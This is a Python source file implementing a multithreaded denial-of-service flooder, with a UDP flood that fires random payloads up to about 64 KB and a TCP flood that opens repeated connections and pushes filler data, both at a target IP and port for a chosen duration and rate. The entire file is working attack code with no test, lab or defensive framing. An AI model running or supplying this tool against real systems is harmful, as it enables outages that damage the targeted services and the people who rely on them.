import socket
import random
import time
import threading
import platform

def udp_flood(target_ip, target_port, duration, pps, threads=1, weight=1):
    print(f"[INFO] Starting UDP flood on {target_ip}:{target_port} ({threads} threads, {pps} pps, {duration}s, weight {weight})")
    def udp_worker(target_ip, target_port, stop_event, pps, stats, weight):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        min_size = 64
        max_size = 65507
        size = min_size + int((max_size - min_size) * (weight - 1) / 9)
        bytes_to_send = random._urandom(size)
        while not stop_event.is_set():
            start = time.time()
            sent = 0
            for _ in range(pps):
                if stop_event.is_set():
                    break
                try:
                    if platform.system().lower() == "windows":
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.sendto(bytes_to_send, (target_ip, target_port))
                        s.close()
                    else:
                        sock.sendto(bytes_to_send, (target_ip, target_port))
                    sent += 1
                except Exception:
                    pass
            stats['sent'] += sent
            elapsed = time.time() - start
            if elapsed < 1:
                time.sleep(1 - elapsed)
    stop_event = threading.Event()
    stats = {'sent': 0}
    thread_list = []
    try:
        for _ in range(threads):
            t = threading.Thread(target=udp_worker, args=(target_ip, target_port, stop_event, pps, stats, weight))
            t.daemon = True
            t.start()
            thread_list.append(t)
        start_time = time.time()
        while time.time() - start_time < duration:
            print(f"\r[PROGRESS] Packets sent: {stats['sent']}", end='', flush=True)
            time.sleep(0.5)
        stop_event.set()
    except KeyboardInterrupt:
        print("\n[INFO] Early stop requested.")
        stop_event.set()
    for t in thread_list:
        t.join()
    print(f"\n[INFO] UDP flood finished. Total packets sent: {stats['sent']}")

def tcp_flood(target_ip, target_port, duration, pps, threads=1, weight=1):
    print(f"[INFO] Starting TCP flood on {target_ip}:{target_port} ({threads} threads, {pps} pps, {duration}s, weight {weight})")
    def tcp_worker(target_ip, target_port, stop_event, pps, stats, weight):
        min_size = 64
        max_size = 65535
        size = min_size + int((max_size - min_size) * (weight - 1) / 9)
        data = b"X" * size
        while not stop_event.is_set():
            start = time.time()
            sent = 0
            for _ in range(pps):
                if stop_event.is_set():
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    if platform.system().lower() == "windows":
                        sock.settimeout(1)
                    else:
                        sock.settimeout(0.5)
                    sock.connect((target_ip, target_port))
                    try:
                        sock.sendall(data)
                    except Exception:
                        pass
                    sock.close()
                    sent += 1
                except Exception:
                    pass
            stats['sent'] += sent
            elapsed = time.time() - start
            if elapsed < 1:
                time.sleep(1 - elapsed)
    stop_event = threading.Event()
    stats = {'sent': 0}
    thread_list = []
    try:
        for _ in range(threads):
            t = threading.Thread(target=tcp_worker, args=(target_ip, target_port, stop_event, pps, stats, weight))
            t.daemon = True
            t.start()
            thread_list.append(t)
        start_time = time.time()
        while time.time() - start_time < duration:
            current_sent = stats['sent']
            print(f"\r[PROGRESS] Connections sent: {current_sent}", end='', flush=True)
            time.sleep(0.5)
        stop_event.set()
    except KeyboardInterrupt:
        print("\n[INFO] Early stop requested.")
        stop_event.set()
    for t in thread_list:
        t.join()
    print(f"\n[INFO] TCP flood finished. Total connections sent: {stats['sent']}")
